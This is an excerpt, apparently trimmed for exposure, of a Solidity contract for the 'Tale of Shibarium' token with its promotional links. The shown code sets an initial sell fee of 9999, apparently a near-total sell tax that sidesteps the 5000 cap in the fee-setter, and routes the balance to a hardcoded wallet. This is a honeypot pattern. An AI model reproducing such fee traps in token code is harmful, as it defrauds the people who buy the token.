...
Public Portal: https://t.me/TOS_ERC
Medium: https://medium.com/@taleofshibarium/tale-of-shibarium-967c31842131
Twitter: https://twitter.com/TaleOfShibarium
Website: https://tos-erc.live/
...
contract TOS is Context, IERC20, Ownable {
    ...
    string private constant _name = "Tale of Shibarium";
    ...
    uint256 public sellMarketingFee = 9999;
    ...
    constructor () {
        ...
        feeAddrWallet = payable(0x9DF31F61cBFEC501683ADd3661bb06E8706141CD);    
    ...
    function manualsend() external{
        feeAddrWallet.transfer(address(this).balance);
    }

    function modifyMarketingFee(uint256 _buyfees, uint256 _sellfees) external onlyOwner {
        buyMarketingFee = _buyfees;
        totalBuyFees = buyAutoLiquidityFee + buyAutoBurnFee + buyMarketingFee;
        sellMarketingFee = _sellfees;
        totalSellFees =  sellAutoLiquidityFee + sellAutoBurnFee + sellMarketingFee;
        require (totalBuyFees+totalSellFees <= 5000);
    }
